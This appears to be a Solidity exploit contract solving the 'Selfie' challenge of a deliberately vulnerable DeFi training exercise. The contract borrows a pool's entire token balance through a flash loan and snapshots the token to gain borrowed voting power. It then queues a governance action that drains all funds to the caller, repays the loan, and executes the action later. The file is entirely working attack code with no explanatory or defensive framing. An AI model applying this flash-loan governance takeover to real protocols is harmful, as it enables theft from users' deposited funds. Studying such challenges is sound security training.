//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

//should I approve my address to spend the balance,
// or should i delegateCall and change governance address to my address? <-- nvm selfiPool would have to delegateCall not me

import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfieKiller {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public gov;
    uint public actionId;

    constructor(address addr, address tknAddr, address govAddr) {
        pool = SelfiePool(addr);
        token = DamnValuableTokenSnapshot(tknAddr);
        gov = SimpleGovernance(govAddr);
    }

    function initiateMurder() public {
        //console.log("poolBalance:", token.balanceOf(address(pool)));
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address addr, uint num) public {
        // Fun stuff with gov
        token.snapshot();
        bytes memory data = abi.encodeCall(pool.drainAllFunds, tx.origin);
        //console.log("data:", string(data));
        actionId = gov.queueAction(address(pool), data, 0);
        //Finish with returning flashloan
        bool sent = token.transfer(address(pool), num);
        //console.log("sent:", sent);
    }

    function drainDrainGoAwayComeAgainAnotherDay() public {
        gov.executeAction(actionId);
        //token.transfer()
    }
}
